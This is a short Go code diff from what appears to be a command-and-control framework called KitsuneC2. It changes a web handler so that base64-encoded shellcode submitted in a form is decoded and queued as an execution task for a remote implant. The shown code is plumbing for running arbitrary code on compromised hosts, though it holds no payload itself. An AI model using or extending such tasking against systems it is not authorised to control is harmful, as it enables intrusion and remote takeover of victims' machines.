@@ -3,6 +3,7 @@ package web
 import (
 	"KitsuneC2/lib/communication"
 	"KitsuneC2/server/api"
+	"encoding/base64"
 	"errors"
 	"io"
 	"os"
@@ -135,11 +136,19 @@ func addUpload(c *gin.Context, implantId string) error {
 
 func addShellcodeExec(c *gin.Context, implantId string) error {
 	var shellcode communication.ShellcodeExecReq
-	if err := c.ShouldBind(&shellcode); err != nil {
+
+	shellcodeAsStr := c.PostForm("Shellcode")
+	if shellcodeAsStr == "" {
 		return errMissingArgs
 	}
 
+	shellcodeAsBytes, err := base64.StdEncoding.DecodeString(shellcodeAsStr)
+	if err != nil {
+		return errMissingArgs
+	}
+	shellcode.Shellcode = shellcodeAsBytes
+
 	var task communication.Task = &shellcode
-	_, err := api.AddTaskForImplant(implantId, communication.SHELLCODE_EXEC_REQ, &task)
+	_, err = api.AddTaskForImplant(implantId, communication.SHELLCODE_EXEC_REQ, &task)
 	return err
 }
